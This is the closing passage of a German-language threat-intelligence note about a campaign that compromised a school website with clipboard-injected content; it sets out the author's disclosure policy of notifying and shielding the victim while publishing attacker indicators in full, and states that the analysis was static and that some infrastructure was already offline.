Die betroffene Schule wurde am selben Tag unterrichtet, unentgeltlich und ohne
Auftragsinteresse, mit Maßnahmenvorschlägen und einem Textbaustein für die Elternschaft.
**Die Seite wird hier bewusst nicht benannt**, und es wird kein Screenshot von ihr
veröffentlicht: Sie ist Geschädigte, der Betreiber hat die Information zuerst erhalten, und
eine Benennung nützte keinem Verteidiger.

Angreiferkontrollierte Indikatoren werden vollständig veröffentlicht, TLP:CLEAR, weil sie
genau dadurch brauchbar werden. Die beiden Kategorien werden absichtlich getrennt gehalten
— eine Kampagnenbeschreibung, die ihre Opfer benennt, um gründlich zu wirken, hat
Dokumentation mit Bloßstellung verwechselt.

---

*Diese Notiz dokumentiert Beobachtungen vom 04.08.2026 und den folgenden Tagen. Die Analyse
des Zwischenablage-Inhalts erfolgte statisch, es wurde nichts ausgeführt. Infrastruktur
dieser Art ändert sich binnen Tagen; mehrere der genannten Indikatoren waren bereits tot,
als dies geschrieben wurde.*
